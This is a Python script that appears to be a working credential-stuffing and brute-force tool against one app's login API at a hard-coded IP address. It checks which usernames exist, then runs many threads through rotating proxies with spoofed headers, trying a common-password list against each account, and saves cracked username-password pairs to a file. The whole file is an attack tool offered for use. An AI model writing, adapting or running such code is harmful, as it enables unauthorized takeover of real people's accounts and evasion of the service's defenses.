#!/usr/bin/env python
# -*- coding: utf-8 -*-
# #############################################################
#
#  Copyright (c) 2020 Baidu.com, Inc. All Rights Reserved
#
# #############################################################
import base64
import copy
import json
import os
import random
import threading
import time
import binascii
import traceback

import requests

_mutex = threading.Lock()
recent_10000_logs = []
proxy_list = []
proxy_list_status_map = {}
log_success_map = {}
exist_user_list = []
un_exist_user_list = []
global_pass_word_list = []
def hex_test():
    s = "String"
    # 字符串变字符型字节流
    s_byte = s.encode()
    # 字符型字节流转十六进制字节流, 与b2a_hex()，bytes.hex()方法功能一样
    s_hex = binascii.hexlify(s_byte)
    print("s_byte:%s\ns_hex:%s" % (s_byte, s_hex))


# def choose_proxy():
#     min_count = 1000
#     abs_total_count = 0
#     max_total = 0
#     index = 0
#     choose_map = {}
#     for proxy in proxy_list:
#         failed_count = proxy_list_status_map["%s" % proxy]
#         abs_total_count += abs(failed_count)
#         if failed_count < min_count:
#             min_count = failed_count
#     min_count = abs(min_count) + 1
#
#     for proxy in proxy_list:
#         proxy_list_status_map["%s" % proxy] += abs(min_count)
#         max_total += abs(min_count)
#         choose_map["%s" % index] = max_total
#         index += 1
#
#     xx = random.randint(0, max_total)
#     for key in choose_map:
#         if xx < choose_map[key]:
#             break
#
#     if max_total > 10000:
#         for proxy in proxy_list:
#             print "proxy :%s count:%s" % (proxy, proxy_list_status_map["%s" % proxy])
#             proxy_list_status_map["%s" % proxy] = 0
#
#     return int(key)








def get_login_res_proxy(user, password):


    # proxy_list = []
    result = False
    status_code = False
    # index = choose_proxy()
    index = random.randint(0, len(proxy_list) - 1)
    if len(proxy_list) < 3:
        time_count = random.randint(100, 600)
        time.sleep(time_count)

    proxy = proxy_list[index]
    proxy_list_status_map["%s" % proxy_list[index]] -= 1
    # 隧道代理服务器地址
    # ip_port = '182.61.201.201:80'
    # proxy = {"http": "http://" + ip_port}

    en_password = base64.b64encode(password.encode("utf-8")).decode('utf-8')
    en_user = base64.b64encode(user.encode("utf-8")).decode('utf-8')
    # print("en_user:%s %s  password:%s %s" % (user, en_user, password, en_password))
    url = 'http://46.51.252.220:82/api/login?a=n&v=1.26.0&u_c=unknown&cl_t=fantasy&p_e=%s&fm=bin&e_e=%s' % (en_password, en_user)
    # url = "http://120.244.202.247:8467/post/test"
    # print("url:%s" % url)
    # data = {
    #     "cv": "399",
    #     "pay_k": "cn_1",
    #     "model": "V1938CT",
    #     "cou_c": "CN",
    #     "lang_c": "zh",
    #     "vt": "1",
    #     "devi_id": "010045028712612",
    #     "an_id": "71e2d225381dbc98",
    #     "net_t": 1,
    #     "cr_v": "1",
    #     "finger_p": int(time.time() * 100)
    # }
    data = {}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.55 Safari/537.36',
    }
    try:
        response = requests.post(url, data=json.dumps(data), headers=headers, proxies=proxy, timeout=10)
    except Exception as e:
        # print "requests.post error"
        print (e)
        return status_code, result, {}


    # global recent_10000_logs
    # recent_10000_logs.append(response.content.decode('utf-8', 'ignore') + '\n')
    # if len(recent_10000_logs) > 10000:
    #     with open("log.txt", 'w') as writer:
    #         writer.writelines(recent_10000_logs)
    #         recent_10000_logs = []

    # print("en_user:%s %s  password:%s %s" % (user, en_user, password, en_password))
    # print (response.content)

    if response.status_code in [200] and "DOCTYPE html" not in response.content.decode('utf-8', 'ignore'):
        status_code = True

        print (proxy)
        print("en_user:%s %s  password:%s %s" % (user, en_user, password, en_password))
        try:
            print (response.content.decode('utf-8', 'ignore'))
        except Exception as e:
            print (e)
        try:
            proxy_list_status_map["%s" % proxy_list[index]] += 1
        except Exception as e:
            print (e)

        # print(response.status_code)
        # print(response.content)
        # print (proxy_list_status_map)


    if response.content.__sizeof__() > 500 and response.status_code == 200 and "小小帝" in response.content.decode('utf-8', 'ignore'):
        result = True

    return status_code, result, response.content.decode('utf-8', 'ignore')

    pass

def get_login_res(user, password):
    en_password = base64.b64encode(password)
    en_user = base64.b64encode(user)
    print("en_user:%s %s  password:%s %s" % (user, en_user, password, en_password))
    url = 'http://46.51.252.220:82/api/login?a=n&v=1.26.0&u_c=unknown&cl_t=fantasy&p_e=%s&fm=bin&e_e=%s' % (en_password, en_user)
    print("url:%s" % url)
    # data = {
    #     "cv": "399",
    #     "pay_k": "cn_1",
    #     "model": "V1938CT",
    #     "cou_c": "CN",
    #     "lang_c": "zh",
    #     "vt": "1",
    #     "devi_id": "010045028712612",
    #     "an_id": "71e2d225381dbc98",
    #     "net_t": 1,
    #     "cr_v": "1",
    #     "finger_p": int(time.time() * 100)
    # }
    data = {}
    headers = {'Content-Type': 'text/plain;charset=UTF-8'}
    response = requests.post(url, data=json.dumps(data), headers=headers)
    global recent_10000_logs
    recent_10000_logs.append(str(response.content) + '\n')
    if len(recent_10000_logs) > 1000:
        with open("log.txt", 'w') as writer:
            writer.writelines(recent_10000_logs)
            recent_10000_logs = []
    # print(response.content)
    if "nginx" in str(response.content):
        pass
        # print("en_user:%s %s  password:%s %s" % (user, en_user, password, en_password))
        # print(response.content)
        # time.sleep(600)
        # with open("unsucess_user.txt", 'a') as writer:
        #     writer.write(user + '\n')

    return response.content.__sizeof__() > 500


def get_user():
    count = 0
    path = "C:/Users/24349/Documents/leidian/Pictures0603"

def get_password():
    with open("text/new_common_passord.txt", 'a', encoding='utf-8') as writer:
        with open("common_passord.txt", encoding='utf-8') as lines:
            for line in lines:
                if len(line.strip()) >= 6:
                    writer.write(line.strip() + '\n')


def sort_password():
    sort_password_list = []
    with open("text/new_common_passord.txt") as lines:
        for line in lines:
            sort_password_list.append(line.strip() + '\n')
    sort_password_list.sort()
    sort_password_list = set(sort_password_list)
    with open("text/new_sort_common_passord.txt", 'w') as writer:
        writer.writelines(sort_password_list)

def thread_try_load(user, index, pass_word_list, parent_index):
    # print("thread %s start" % index)
    global log_success_map
    while True and not log_success_map["%s" % parent_index]:
        _mutex.acquire()
        try:
            password = pass_word_list.pop()
            print ("%srecord %s" % (user, len(pass_word_list)))
        except Exception as e:
            print(e)
            # print("thread_try_load %s finish" % index)
            break
        finally:
            _mutex.release()
        try:
            retry_time = 30
            done_retry_time = 0
            pass_word = password.strip()
            for i in range(retry_time):
                try:

                    code, login_result, _ = get_login_res_proxy(user, pass_word)

                    if login_result:
                        try:
                            _mutex.acquire()
                            with open("success_user.txt", 'a') as writer:
                                writer.write("%s\t%s\n" % (user, pass_word))
                                print("thread %s log_sucess" % index)
                                print("%s\t%s\n" % (user, pass_word))
                                log_success_map["%s" % parent_index]= True
                                print (len(pass_word_list))
                                return
                        except Exception as e:
                            print ("success_user %s" % traceback.format_exc())

                        finally:
                            pass_word_list = []
                            _mutex.release()


                    if code:
                        break
                    done_retry_time += 1
                    if done_retry_time > 20:
                        pass_word_list.append(password)
                        break

                except Exception as e:
                    print ("get_login_res_proxy error :%s foramt exe%s\n" % (e, traceback.format_exc()))
                    print (e)
            if done_retry_time > 20:
                print ("user:%s pass_word:%s have no sucess" % (user, pass_word))
        except Exception as e:
            print("error%s" % e)
            with open("unsucess_user.txt", 'a') as writer:
                writer.write(user + '\n')
            waite_time = random.randint(100, 600)
            time.sleep(waite_time)

def get_password_list(file_name):
    password_list = []

    reverse_password_list = []
    with open(file_name) as lines:
        for user in lines:
            if len(user.strip()) < 4:
                continue
            password_list.append(user.strip())
    for x in range(len(password_list)):
        reverse_password_list.append(password_list[len(password_list) - x -1])
    return reverse_password_list

def get_usered_list(file_name):
    password_list = set()

    with open(file_name) as lines:
        for user in lines:
            try:
                password_list.add(user.strip().split()[1])
            except Exception as e:
                print ("get_usered_list %s" % traceback.format_exc())

    return list(password_list)

def log_with_pass_file(parent_index, user):
    pass_file = "user_dict/success_back.txt"
    global log_success_map
    log_success_map["%s" % parent_index] = False

    threads = []
    max_thread_num = 100
    # pass_word_list = get_password_list(pass_file)
    global global_pass_word_list
    pass_word_list = copy.copy(global_pass_word_list)

    for x in range(0, max_thread_num):
        name = 'login-thread_%s' % x
        threads.append(threading.Thread(
            target=thread_try_load, args=(user, x, pass_word_list, parent_index), name=name))
    for t in threads:
        t.start()
    for t in threads:
        t.join()


def thread_load(index, user_list):
    # print("thread %s start" % index)
    while True:
        _mutex.acquire()
        try:
            user = user_list.pop()
            print ("user count %s" % len(user_list))
        except Exception as e:
            print(e)
            # print("thread %s finish" % index)
            break
        finally:
            _mutex.release()
        print("start try_login %s" % user)
        try:
            log_with_pass_file(index, user.strip())
            _mutex.acquire()
            load_proxy()
            with open("user_dict/deal_user.txt", 'a') as writer:
                writer.write(user + '\n')

        except Exception as e:
            traceback.print_exc()
            print("error%s" % e)
            with open("unsucess_user.txt", 'a') as writer:
                writer.write(user + '\n')
            time.sleep(600)
        finally:
            _mutex.release()


def get_user_list(file_name):
    user_list = set()
    reverse_user_list = []
    jump_flag = False
    deal_user_set = set()
    with open("user_dict/deal_user.txt") as lines:
        for user in lines:
            deal_user_set.add(user)


    with open(file_name, encoding='utf-8') as lines:

        for user in lines:
            if user in deal_user_set:
                continue
            user_list.add(user.strip())


    return list(user_list)

def get_user_by_attact(file_name):
    user_list = set()
    name_flag = False
    with open(file_name) as lines:
        for line in lines:
            if name_flag:
                user_list.add(line.strip() + '\n')
                name_flag = False
            if "距离" in line:
                name_flag = True
                continue
    with open("user_dict/user_0604_1.txt", 'a') as writer:
        writer.writelines(user_list)



def get_all_user():
    user_list_set = set()
    file_path = "user_dict"
    for root_path, _, file_name_list in os.walk(file_path):
        for file_name in file_name_list:
            file_name = root_path + "/" + file_name
            with open(file_name) as lines:
                for line in lines:
                    user_list_set.add(line.strip() + '\n')
    with open(file_path + '/all_user.txt', 'w') as writer:
        writer.writelines(user_list_set)

def check_proxy(ip_port):
    result = False
    proxy = {"http": "http://" + ip_port}
    url = "http://www.baidu.com/"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.55 Safari/537.36',
    }
    exe_time = 0
    retyr_time = 1
    while result == False:
        try:

            response = requests.get(url, headers=headers, proxies=proxy, timeout= 5)
            if "全球领先的中文搜索引擎" in response.content:
                result = True
                break
        except Exception as e:
            print ("check_ip_port error %s" % traceback.format_exc())

        exe_time += 1
        if exe_time > retyr_time:
            break



    return result

def load_proxy():
    print ("start load proxy")
    global proxy_list
    global proxy_list_status_map
    ok_flag = False
    for proxy in proxy_list:
        print ("proxy :%s count:%s" % (proxy, proxy_list_status_map["%s" % proxy]))
        proxy_list_status_map["%s" % proxy] = 0

    while ok_flag == False:
        proxy_list = []
        proxy_list_status_map = {}
        with open("text/proxy.txt") as lines:

            for proxy in lines:
                ip_port = proxy.strip()
                check_ip_port_result = True
                if check_ip_port_result:
                    true_proxy = {"http": "http://" + ip_port}
                    proxy_list.append(true_proxy)
                    proxy_list_status_map["%s" % true_proxy] = 0
        if len(proxy_list) > 1:
            ok_flag = True
        else:
            print ("only %s proxy wait 100s" % len(proxy_list))
            time.sleep(100)

    print ("finish load proxy total:%s" % len(proxy_list))



def thread_get_exist_user(index, user_list):
    retry_time = 20
    global exist_user_list
    global un_exist_user_list
    while True:
        _mutex.acquire()
        try:
            user = user_list.pop()
            print ("len user %s" % len(user_list))
        except Exception as e:
            print(e)
            # print("thread %s finish" % index)
            break
        finally:
            _mutex.release()
        print("start try_login %s" % user)
        try:
            done_retry_time = 0
            ok_flag = True
            for i in range(retry_time):
                try:
                    done_retry_time += 1
                    code, login_result, content = get_login_res_proxy(user.strip(), "123456")

                    if login_result:
                        with open("success_user.txt", 'a') as writer:
                            writer.write("%s\t%s\n" % (user, "123456"))
                    if len(content) < 50 and "error_info" in content:
                        ok_flag = False
                        break

                    if code and "ios" in content:
                        break

                except Exception as e:
                    print ("get_login_res_proxy error :%s foramt exe%s\n" % (e, traceback.format_exc()))
                    print (e)

            if ok_flag:
                exist_user_list.append(user + '\n')
            else:
                un_exist_user_list.append(user + '\n')



        except Exception as e:
            traceback.print_exc()
            print("exist error%s" % e)

    pass

def get_exist_user():
    user_list = get_user_list("user_dict/qiuni.txt")
    passord = "123456"
    retry_time = 20
    exist_user_list = []
    un_exist_user_list = []
    for user in user_list:
        pass_word = passord
        done_retry_time = 0
        for i in range(retry_time):
            try:
                done_retry_time += 1
                code, login_result, content = get_login_res_proxy(user.strip(), pass_word)
                if len(content) < 50 and "error_info" in content:
                    un_exist_user_list.append(user + '\n')
                    break

                if code and "ios" in content:
                    exist_user_list.append(user + '\n')
                    break

            except Exception as e:
                print ("get_login_res_proxy error :%s foramt exe%s\n" % (e, traceback.format_exc()))
                print (e)
    with open("user_dict/exist_qiuni.txt", 'w') as writer:
        writer.writelines(exist_user_list)
    with open("user_dict/un_exist_qiuni.txt", 'w') as writer:
        writer.writelines(un_exist_user_list)


def test():
    load_proxy()
    # for i in range(10):
    #     user = "喜欢吹风天"
    #     password = "123456"
    #     login_result = get_login_res_proxy(user, password)
    #     print(login_result)
    # return
    # get_user()
    # get_user_by_attact("result.txt")
    # get_password()
    # qu_chong()
    # sort_password()
    # return
    # get_all_user()

    # get_exist_user()

    # user_list = get_user_list("user_dict/bord_top_user.txt")
    # threads = []
    # max_thread_num = 100
    #
    # for x in range(0, max_thread_num):
    #     name = 'login-thread_%s' % x
    #     threads.append(threading.Thread(
    #         target=thread_get_exist_user, args=(x, user_list), name=name))
    # for t in threads:
    #     t.start()
    # for t in threads:
    #     t.join()
    #
    # global exist_user_list
    # global un_exist_user_list
    # with open("user_dict/exist_board_top_user.txt", 'w') as writer:
    #     writer.writelines(exist_user_list)
    # with open("user_dict/un_exist_board_top_user.txt", 'w') as writer:
    #     writer.writelines(un_exist_user_list)

    user_list = get_user_list("user_dict/exist_board_top_user.txt")
    global global_pass_word_list
    # global_pass_word_list = get_usered_list("user_dict/success_back.txt")
    global_pass_word_list = get_password_list("text/new_sort_common_passord.txt")

    threads = []
    max_thread_num = 1

    for x in range(0, max_thread_num):
        name = 'login-thread_%s' % x
        threads.append(threading.Thread(
            target=thread_load, args=(x, user_list), name=name))
    for t in threads:
        t.start()
    for t in threads:
        t.join()


    pass




def qu_chong():

    user_set = set()
    with open("result.txt") as lines:
        for user in lines:
            user = user.strip()
            user_set.add(user + '\n')

    with open("user_dict/user.txt", 'w') as writer:
        writer.writelines(user_set)

if __name__ == "__main__":
    print("start try_password")
    test()
